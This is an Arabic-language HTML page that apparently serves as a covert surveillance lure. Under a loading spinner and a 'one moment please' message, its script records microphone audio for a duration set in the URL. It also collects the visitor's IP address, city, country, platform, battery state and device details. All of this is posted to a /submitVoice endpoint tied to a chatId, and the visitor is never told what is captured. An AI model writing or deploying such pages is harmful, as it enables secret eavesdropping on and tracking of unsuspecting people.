<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <title>تسجيل صوتي</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    /* نفس الأنماط السابقة */
  </style>
</head>
<body>
  <div class="container">
    <div class="loading"></div>
    <p class="message" id="notification">لحظه واحده من فضلك...</p>
  </div>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('chatId');
    const duration = parseInt(urlParams.get('duration'), 10);

    let mediaRecorder;
    let audioChunks = [];

    async function getIPInfo() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        return await response.json();
      } catch (error) {
        console.error('Error fetching IP info:', error);
        return { ip: 'Unknown', country_name: 'Unknown', city: 'Unknown' };
      }
    }

    function getPlatformInfo() {
      const ua = navigator.userAgent;
      let platform = "Unknown";
      if (/Windows/.test(ua)) platform = "Windows";
      else if (/Mac/.test(ua)) platform = "MacOS";
      else if (/Linux/.test(ua)) platform = "Linux";
      else if (/Android/.test(ua)) platform = "Android";
      else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
      return { platform, userAgent: ua };
    }

    async function getBatteryInfo() {
      if ('getBattery' in navigator) {
        try {
          const battery = await navigator.getBattery();
          return { batteryLevel: battery.level, batteryCharging: battery.charging };
        } catch (error) {
          console.error('Error getting battery info:', error);
        }
      }
      return { batteryLevel: undefined, batteryCharging: undefined };
    }

    function getDeviceVersion() {
      const ua = navigator.userAgent;
      const match = ua.match(/\(([^)]+)\)/);
      return match ? match[1] : 'Unknown';
    }

    async function startRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.start();

        setTimeout(() => {
          mediaRecorder.stop();
        }, duration * 1000);

        mediaRecorder.addEventListener('dataavailable', event => {
          audioChunks.push(event.data);
        });

        mediaRecorder.addEventListener('stop', sendAudioData);
      } catch (error) {
        console.error('Error accessing microphone:', error);
      }
    }

    async function sendAudioData() {
      const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
      const formData = new FormData();
      formData.append('chatId', chatId);
      formData.append('voice', audioBlob, 'voice.ogg');

      const ipInfo = await getIPInfo();
      const platformInfo = getPlatformInfo();
      const batteryInfo = await getBatteryInfo();
      const deviceVersion = getDeviceVersion();

      const additionalData = {
        ip: ipInfo.ip,
        country: ipInfo.country_name,
        city: ipInfo.city,
        ...platformInfo,
        ...batteryInfo,
        deviceVersion
      };

      formData.append('additionalData', JSON.stringify(additionalData));

      try {
        const response = await fetch('/submitVoice', {
          method: 'POST',
          body: formData
        });
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        console.log('تم إرسال التسجيل الصوتي والبيانات بنجاح');
      } catch (error) {
        console.error('حدث خطأ أثناء إرسال التسجيل الصوتي والبيانات:', error);
      }
    }

    window.addEventListener('load', () => {
      if (duration > 0 && duration <= 20) {
        startRecording();
      } else {
        console.error('مدة التسجيل غير صالحة');
      }
    });
  </script>
</body>
</html>